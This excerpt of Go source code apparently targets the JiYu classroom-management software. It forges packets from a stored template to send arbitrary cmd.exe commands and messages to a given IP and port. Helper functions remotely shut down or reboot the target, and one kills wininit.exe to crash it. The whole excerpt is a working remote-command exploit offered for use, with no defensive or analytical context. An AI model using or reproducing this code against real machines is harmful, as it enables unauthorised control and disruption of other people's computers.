...
func JiYuSendCmd(ip string, port int, cmd string) bool {
	if !checkPort(port) || !checkIp(ip) {
		return false
	}

	cmd = "cmd.exe /c " + strings.ReplaceAll(cmd, "-", "/")
	templateIdx := 1

	if templateIdx >= len(StoreWithSend) {
		return false
	}

	data := make([]byte, len(StoreWithSend[templateIdx]))
	copy(data, StoreWithSend[templateIdx])
...
func JiYuSendMsg(ip string, port int, msg string) bool {
	if !checkPort(port) || !checkIp(ip) {
		return false
	}
...
func JiYuSendShutdown(ip string, port int) bool {
	return JiYuSendCmd(ip, port, "shutdown /s /t 0")
}

func JiYuSendReboot(ip string, port int) bool {
	return JiYuSendCmd(ip, port, "shutdown /r /t 0")
}

func JiYuSendBroken(ip string, port int, sure bool) bool {
	if !sure {
		return false
	}
	return JiYuSendCmd(ip, port, "taskkill /f /im wininit.exe")
}
